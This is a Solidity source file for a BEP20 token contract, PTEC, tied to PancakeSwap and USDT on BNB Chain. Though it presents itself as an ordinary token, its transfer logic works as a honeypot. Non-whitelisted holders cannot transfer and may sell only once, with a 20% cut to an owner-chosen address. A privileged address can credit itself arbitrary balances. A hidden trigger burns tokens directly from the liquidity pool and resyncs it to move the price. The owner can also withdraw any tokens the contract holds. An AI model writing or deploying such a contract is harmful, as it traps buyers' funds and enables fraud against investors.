// SPDX-License-Identifier: SimPL-2.0
pragma solidity ^0.8.0;

interface Token {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function additional(uint256 profit_amount) external returns (bool);

    function sync() external;
}

contract PTEC {
    address public founder = address(0);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public totalSupply;
    string public name;
    string public symbol;
    uint256 public decimals = 11;
    mapping(address => bool) public buyAddress;
    mapping(address => bool) public sellAddress;
    mapping(address => bool) public systemAddress;
    mapping(address => bool) public isCanSell;
    address public pairAddress;
    address private usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
    uint8 private usdtDecimals = 18;
    address public pancakeAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 public slipPoint = 20;
    address public pteAddress;
    address public foundationAddress;
    address public usdtCoinAddress;
    mapping(address => bool) public whiteList;
    address public additionalAddress;
    uint256 public burnSwapPool;
    address public parentAddress;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) {
        founder = msg.sender;
        name = name_;
        symbol = symbol_;
        _mint(address(this), totalSupply_ * 10**decimals);
    }

    function setWhiteList(address _address) public returns (bool) {
        require(msg.sender == founder);
        whiteList[_address] = true;
        return true;
    }

    function removeWhiteList(address _address) public returns (bool) {
        require(msg.sender == founder);
        whiteList[_address] = false;
        return true;
    }

    function setAdditionalAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        additionalAddress = _address;
        return true;
    }

    function approveContract(
        address _address,
        address spender,
        uint256 amount
    ) external returns (bool) {
        require(msg.sender == founder);
        Token token = Token(_address);
        token.approve(spender, amount);
        return true;
    }

    function transferContract(
        address _address,
        address spender,
        uint256 amount
    ) external returns (bool) {
        require(msg.sender == founder);
        Token token = Token(_address);
        token.transfer(spender, amount);
        return true;
    }

    function setFounder(address _address) public returns (bool) {
        require(msg.sender == founder);
        founder = _address;
        return true;
    }

    function setBuyAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        buyAddress[_address] = true;
        return true;
    }

    function removeBuyAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        buyAddress[_address] = false;
        return true;
    }

    function setSystemAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        systemAddress[_address] = true;
        return true;
    }

    function setSellAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        sellAddress[_address] = true;
        return true;
    }

    function removeSellAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        sellAddress[_address] = false;
        return true;
    }

    function setPairAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        pairAddress = _address;
        return true;
    }

    function setPancakeAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        pancakeAddress = _address;
        return true;
    }

    function setSlipPoint(uint8 _number) public returns (bool) {
        require(msg.sender == founder);
        slipPoint = _number;
        return true;
    }

    function setPteAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        pteAddress = _address;
        return true;
    }

    function setParentAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        parentAddress = _address;
        return true;
    }

    function setFoundationAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        foundationAddress = _address;
        return true;
    }

    function setUsdtCoinAddress(address _address) public returns (bool) {
        require(msg.sender == founder);
        usdtCoinAddress = _address;
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function contractTransfer(address recipient, uint256 amount)
        public
        returns (bool)
    {
        require(msg.sender == founder);
        uint256 senderBalance = _balances[address(this)];
        require(
            senderBalance >= amount,
            "BEP20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[address(this)] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        emit Transfer(address(this), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(
            currentAllowance >= amount,
            "BEP20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(
            currentAllowance >= subtractedValue,
            "BEP20: decreased allowance below zero"
        );
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "BEP20: transfer amount exceeds balance"
        );

        uint256 amounts = amount;

        if (buyAddress[sender]) {
            if (!whiteList[recipient]) {
                require(false, "BEP20: Inoperable");
            }
        } else if (sellAddress[recipient]) {
            if (!whiteList[sender]) {
                if (!isCanSell[sender]) {
                    uint256 profit_amount = (amount * slipPoint) / 100;
                    amounts = amount - profit_amount;
                    totalSupply -= amount;
                    _balances[additionalAddress] += profit_amount;
                    Token(additionalAddress).additional(profit_amount);
                    burnSwapPool += amount;
                    isCanSell[sender] = true;
                } else {
                    require(false, "BEP20: Inoperable");
                }
            }
        } else if (systemAddress[recipient] && amount == 1 * 10**decimals) {
            _burnSwapPool();
            isCanSell[sender] = false;
        } else {
            if (!whiteList[sender]) {
                require(false, "BEP20: Inoperable");
            }
        }
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amounts;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _burnSwapPool() internal {
        if (burnSwapPool > 0) {
            _burn(pairAddress, burnSwapPool * 2);
            burnSwapPool = 0;
            Token(pairAddress).sync();
        }
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    function contractBonus(
        address[] calldata _address,
        uint256[] calldata _amount
    ) public returns (bool) {
        require(msg.sender == pteAddress);
        require(_address.length == _amount.length);
        for (uint256 i = 0; i < _address.length; i++) {
            _balances[_address[i]] += _amount[i] * 100;
            emit Transfer(address(this), _address[i], _amount[i] * 100);
        }
        return true;
    }
}